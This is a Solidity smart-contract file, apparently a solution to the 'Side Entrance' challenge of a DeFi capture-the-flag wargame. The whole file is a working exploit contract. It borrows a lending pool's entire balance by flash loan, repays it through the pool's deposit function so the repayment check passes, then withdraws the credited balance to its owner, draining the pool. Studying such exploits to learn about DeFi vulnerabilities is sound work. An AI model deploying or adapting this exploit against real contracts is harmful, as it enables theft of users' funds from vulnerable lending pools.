// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ISideEntranceLenderPool {
  function flashLoan(uint256 amount) external;
  function deposit() external payable;
  function withdraw() external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
@title Side Entrance Attack Contract
@author broccolirob
@notice Call flash loan function and then send value back via deposit function. 
Call withdraw function after flash loan function finishes it's check.
 */
 contract SideEntranceAttack is IFlashLoanEtherReceiver {
   address payable owner;
   ISideEntranceLenderPool pool;

   event Deposit(address indexed from, uint256 amount);

   constructor(ISideEntranceLenderPool _pool) {
     owner = payable(msg.sender);
     pool = _pool;
   }

   receive() external payable {
     emit Deposit(msg.sender, msg.value);
   }

   function execute() external payable override {
     require(msg.sender == address(pool), "Only pool");
     pool.deposit{value: msg.value}();
   }

   function attack() external {
     require(msg.sender == owner, "Only owner");
     pool.flashLoan(address(pool).balance);
     pool.withdraw();
     owner.transfer(address(this).balance);
   }
 }